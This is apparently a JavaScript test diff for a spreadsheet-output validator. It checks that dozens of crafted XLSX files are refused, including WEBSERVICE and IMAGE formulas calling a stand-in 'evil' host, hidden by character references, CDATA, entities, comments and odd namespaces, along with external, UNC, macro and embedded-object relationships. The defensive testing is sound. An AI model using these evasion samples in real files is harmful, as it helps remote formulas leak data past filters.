@@ -492,3 +492,378 @@ test("XLSX outputs: macros, objects, links and remote formulas are refused; zip 
     code: "xlsx_invalid",
   });
 });
+
+test("XLSX outputs: every part is read as strict XML, so hidden formulas and links are refused", async () => {
+  const main = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
+  const rel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
+  const decl = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
+  const worksheet = (inner, after = "") =>
+    decl +
+    `<worksheet xmlns="${main}" xmlns:r="${rel}"><sheetData>${inner}</sheetData>${after}</worksheet>`;
+  const cell = (f) => `<row r="1"><c r="A1"><f>${f}</f></c></row>`;
+  // Replaces sheet1 with the given text.
+  const withSheet = (sheetXml) => makeXlsx({ sheetXml });
+  const rels = (inner) =>
+    decl +
+    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
+    inner +
+    "</Relationships>";
+  const cases = [
+    // The review's five probes: each was accepted before.
+    [
+      "a worksheet part not named sheetN.xml",
+      makeXlsx({
+        rels: `<Relationship Id="rId2" Type="${rel}/worksheet" Target="worksheets/data.xml"/>`,
+        parts: [["xl/worksheets/data.xml", worksheet(cell('WEBSERVICE("http://evil")'))]],
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a numeric character reference",
+      withSheet(worksheet(cell('&#87;EBSERVICE("http://evil")'))),
+      "xlsx_invalid",
+    ],
+    [
+      "a prefixed SpreadsheetML namespace",
+      withSheet(
+        decl +
+          `<x:worksheet xmlns:x="${main}"><x:sheetData><x:row r="1"><x:c r="A1"><x:f>WEBSERVICE("http://evil")</x:f></x:c></x:row></x:sheetData></x:worksheet>`,
+      ),
+      "xlsx_link",
+    ],
+    [
+      "a CDATA section",
+      withSheet(worksheet(cell('<![CDATA[WEBSERVICE("http://evil")]]>'))),
+      "xlsx_invalid",
+    ],
+    [
+      "an external relationship written with character references",
+      makeXlsx({
+        parts: [
+          [
+            "xl/worksheets/_rels/sheet1.xml.rels",
+            rels(
+              `<Relationship Id="rId1" Type="${rel}/hyperlink" Target="&#104;ttps://evil/x" TargetMode="&#69;xternal"/>`,
+            ),
+          ],
+        ],
+      }),
+      "xlsx_invalid",
+    ],
+    // Other ways to hide the same text from a pattern.
+    [
+      "a hexadecimal reference",
+      withSheet(worksheet(cell('&#x57;EBSERVICE("http://evil")'))),
+      "xlsx_invalid",
+    ],
+    [
+      "a comment inside a formula",
+      withSheet(worksheet(cell('WEB<!-- -->SERVICE("http://evil")'))),
+      "xlsx_invalid",
+    ],
+    [
+      "an element inside a formula",
+      withSheet(worksheet(cell('WEB<x/>SERVICE("http://evil")'))),
+      "xlsx_invalid",
+    ],
+    [
+      "a DTD entity",
+      withSheet(
+        decl +
+          `<!DOCTYPE worksheet [<!ENTITY w "WEBSERVICE">]><worksheet xmlns="${main}"><sheetData>${cell('&w;("http://evil")')}</sheetData></worksheet>`,
+      ),
+      "xlsx_invalid",
+    ],
+    ["a processing instruction", withSheet(worksheet(cell("1") + "<?evil x?>")), "xlsx_invalid"],
+    ["an undefined entity", withSheet(worksheet(cell("&w;"))), "xlsx_invalid"],
+    [
+      "another declared encoding",
+      withSheet(worksheet(cell("1")).replace("UTF-8", "UTF-7")),
+      "xlsx_invalid",
+    ],
+    [
+      "UTF-16 text",
+      withSheet(Buffer.from(worksheet(cell('WEBSERVICE("http://evil")')), "utf16le")),
+      "xlsx_invalid",
+    ],
+    ["two roots", withSheet(worksheet(cell("1")) + "<worksheet/>"), "xlsx_invalid"],
+    [
+      "an unclosed element",
+      withSheet(worksheet(cell("1")).replace("</worksheet>", "")),
+      "xlsx_invalid",
+    ],
+    [
+      "a duplicate attribute",
+      makeXlsx({
+        parts: [
+          [
+            "xl/worksheets/_rels/sheet1.xml.rels",
+            rels(
+              `<Relationship Id="rId1" Type="${rel}/image" Target="../media/a.png" TargetMode="Internal" TargetMode="External"/>`,
+            ),
+          ],
+        ],
+      }),
+      "xlsx_invalid",
+    ],
+    [
+      "a self-closing look-alike in an attribute",
+      withSheet(
+        worksheet('<row r="1"><c r="A1"><f a="/>">WEBSERVICE("http://evil")</f></c></row>'),
+      ),
+      "xlsx_link",
+    ],
+    // Formulas outside cells, in every part.
+    [
+      "a conditional format",
+      withSheet(
+        worksheet(
+          "",
+          '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>WEBSERVICE("http://evil")</formula></cfRule></conditionalFormatting>',
+        ),
+      ),
+      "xlsx_link",
+    ],
+    [
+      "a data validation",
+      withSheet(
+        worksheet(
+          "",
+          '<dataValidations count="1"><dataValidation type="list" sqref="A1"><formula1>[1]Sheet1!$A$1:$A$3</formula1></dataValidation></dataValidations>',
+        ),
+      ),
+      "xlsx_link",
+    ],
+    [
+      "an x14 extension formula",
+      withSheet(
+        worksheet(
+          "",
+          '<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:dataValidation type="list"><x14:formula1><xm:f>IMAGE("http://evil/x.png")</xm:f></x14:formula1><xm:sqref>A1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst>',
+        ),
+      ),
+      "xlsx_link",
+    ],
+    [
+      "a chart series reference",
+      makeXlsx({
+        parts: [
+          [
+            "xl/charts/chart1.xml",
+            decl +
+              '<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>[1]Sheet1!$B$1:$B$3</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>',
+          ],
+        ],
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a table column",
+      makeXlsx({
+        parts: [
+          [
+            "xl/tables/table1.xml",
+            decl +
+              `<table xmlns="${main}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><calculatedColumnFormula>WEBSERVICE("http://evil")</calculatedColumnFormula></tableColumn></tableColumns></table>`,
+          ],
+        ],
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a pivot's calculated field",
+      makeXlsx({
+        parts: [
+          [
+            "xl/pivotCache/pivotCacheDefinition1.xml",
+            decl +
+              `<pivotCacheDefinition xmlns="${main}"><cacheFields count="1"><cacheField name="x" formula="WEBSERVICE(&quot;http://evil&quot;)"/></cacheFields></pivotCacheDefinition>`,
+          ],
+        ],
+      }),
+      "xlsx_link",
+    ],
+    // Relationships in every part, by mode, target and type.
+    [
+      "an external mode in a drawing's relationships",
+      makeXlsx({
+        parts: [
+          [
+            "xl/drawings/_rels/drawing1.xml.rels",
+            rels(
+              `<Relationship Id="rId1" Type="${rel}/image" Target="https://evil/x.png" TargetMode="external"/>`,
+            ),
+          ],
+        ],
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a UNC target",
+      makeXlsx({
+        rels: `<Relationship Id="rId2" Type="${rel}/worksheet" Target="\\\\evil\\share\\x.xml"/>`,
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a network-path target",
+      makeXlsx({ rels: `<Relationship Id="rId2" Type="${rel}/worksheet" Target="//evil/x.xml"/>` }),
+      "xlsx_link",
+    ],
+    [
+      "an object relationship to an innocently named part",
+      makeXlsx({
+        rels: `<Relationship Id="rId2" Type="${rel}/oleObject" Target="stuff/a.xml"/>`,
+        parts: [["xl/stuff/a.xml", "<a/>"]],
+      }),
+      "xlsx_object",
+    ],
+    [
+      "an embedded package relationship",
+      makeXlsx({
+        rels: `<Relationship Id="rId2" Type="${rel}/package" Target="stuff/a.xml"/>`,
+        parts: [["xl/stuff/a.xml", "<a/>"]],
+      }),
+      "xlsx_object",
+    ],
+    [
+      "a macro relationship",
+      makeXlsx({
+        rels: '<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="stuff/a.xml"/>',
+        parts: [["xl/stuff/a.xml", "<a/>"]],
+      }),
+      "xlsx_macro",
+    ],
+    [
+      "an external link relationship",
+      makeXlsx({
+        rels: `<Relationship Id="rId2" Type="${rel}/externalLink" Target="stuff/a.xml"/>`,
+        parts: [["xl/stuff/a.xml", "<a/>"]],
+      }),
+      "xlsx_link",
+    ],
+    [
+      "a hyperlink with a renamed relationship prefix",
+      withSheet(
+        decl +
+          `<worksheet xmlns="${main}" xmlns:q="${rel}"><sheetData/><hyperlinks><hyperlink ref="A1" q:id="rId9"/></hyperlinks></worksheet>`,
+      ),
+      "xlsx_link",
+    ],
+    [
+      "the IMAGE function",
+      withSheet(worksheet(cell('_xlfn.IMAGE("http://evil/x.png")'))),
+      "xlsx_link",
+    ],
+    [
+      "an obfuscated macro content type",
+      makeXlsx({
+        types:
+          '<Default Extension="bin" ContentType="application/vnd.ms-excel.sheet.macro&#69;nabled.main+xml"/>',
+      }),
+      "xlsx_invalid",
+    ],
+    // Binary parts: only images, by their magic bytes.
+    [
+      "an image that is not one",
+      makeXlsx({ parts: [["xl/media/image1.png", "<worksheet/>"]] }),
+      "xlsx_invalid",
+    ],
+    [
+      "a binary part",
+      makeXlsx({ parts: [["xl/stuff/blob.dat", Buffer.from([0xff, 0xfe, 0x00, 0x01])]] }),
+      "xlsx_invalid",
+    ],
+    [
+      "a text part that is not XML",
+      makeXlsx({ parts: [["xl/stuff/notes.txt", "plain text"]] }),
+      "xlsx_invalid",
+    ],
+  ];
+  for (const [name, bytes, code] of cases)
+    assert.deepEqual(await checkRuntimeOutput("xlsx", bytes), { outcome: "rejected", code }, name);
+
+  // What a Python library writes is accepted as it is: styles, shared strings, a theme with
+  // prefixed names, core properties, a chart over the sheet, a drawing and its image, an
+  // escaped string, an attribute newline written as &#10; and a filter's defined name.
+  const realistic = makeXlsx({
+    cells:
+      '<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1"><f>SUM(B2:B3)&amp;""</f><v>3</v></c></row>',
+    names:
+      '<definedNames><definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Sheet1!$A$1:$B$3</definedName></definedNames>',
+    parts: [
+      [
+        "docProps/core.xml",
+        decl +
+          '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:creator>openpyxl</dc:creator><dcterms:created xsi:type="dcterms:W3CDTF">2026-10-24T10:00:00Z</dcterms:created></cp:coreProperties>',
+      ],
+      [
+        "xl/styles.xml",
+        decl +
+          `<styleSheet xmlns="${main}"><numFmts count="1"><numFmt numFmtId="164" formatCode="[$-409]#,##0.00;[Red]-#,##0.00"/></numFmts></styleSheet>`,
+      ],
+      [
+        "xl/sharedStrings.xml",
+        decl +
+          `<sst xmlns="${main}" count="1" uniqueCount="1"><si><t xml:space="preserve">Shirts &amp; tees &lt;summer&gt;</t></si></sst>`,
+      ],
+      [
+        "xl/theme/theme1.xml",
+        decl +
+          '<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme"><a:themeElements><a:fontScheme name="Office"><a:majorFont><a:latin typeface="Calibri"/><a:font script="Jpan" typeface="ＭＳ Ｐゴシック"/></a:majorFont></a:fontScheme></a:themeElements></a:theme>',
+      ],
+      [
+        "xl/worksheets/_rels/sheet1.xml.rels",
+        rels(`<Relationship Id="rId1" Type="${rel}/drawing" Target="../drawings/drawing1.xml"/>`),
+      ],
+      [
+        "xl/drawings/drawing1.xml",
+        decl +
+          '<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><xdr:twoCellAnchor><xdr:pic><xdr:nvPicPr><xdr:cNvPr id="1" name="Chart" descr="line one&#10;line two"/></xdr:nvPicPr></xdr:pic></xdr:twoCellAnchor></xdr:wsDr>',
+      ],
+      [
+        "xl/drawings/_rels/drawing1.xml.rels",
+        rels(
+          `<Relationship Id="rId1" Type="${rel}/image" Target="../media/image1.png"/><Relationship Id="rId2" Type="${rel}/chart" Target="/xl/charts/chart1.xml" TargetMode="Internal"/>`,
+        ),
+      ],
+      [
+        "xl/charts/chart1.xml",
+        decl +
+          "<c:chartSpace xmlns:c=\"http://schemas.openxmlformats.org/drawingml/2006/chart\"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>'Sheet 1'!$B$2:$B$3</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>",
+      ],
+      ["xl/media/image1.png", makePng()],
+    ],
+  });
+  const accepted = await checkRuntimeOutput("xlsx", realistic);
+  assert.equal(accepted.outcome, "accepted");
+  assert.deepEqual(accepted.bytes, realistic);
+  // Excel's own nesting (an x14 validation's formula1 wraps an xm:f), an internal hyperlink
+  // and tab, newline and carriage-return references are read, not refused.
+  for (const [name, bytes] of [
+    [
+      "x14 validation",
+      withSheet(
+        worksheet(
+          "",
+          '<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:dataValidation type="list"><x14:formula1><xm:f>Sheet2!$A$1:$A$3</xm:f></x14:formula1><xm:sqref>A1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst>',
+        ),
+      ),
+    ],
+    [
+      "internal hyperlink",
+      withSheet(
+        worksheet("", '<hyperlinks><hyperlink ref="A1" location="Sheet1!B2"/></hyperlinks>'),
+      ),
+    ],
+    [
+      "whitespace references",
+      withSheet(
+        worksheet(
+          '<row r="1"><c r="A1" t="inlineStr"><is><t>a&#13;&#10;b&#x9;c</t></is></c></row>',
+        ),
+      ),
+    ],
+  ])
+    assert.equal((await checkRuntimeOutput("xlsx", bytes)).outcome, "accepted", name);
+});
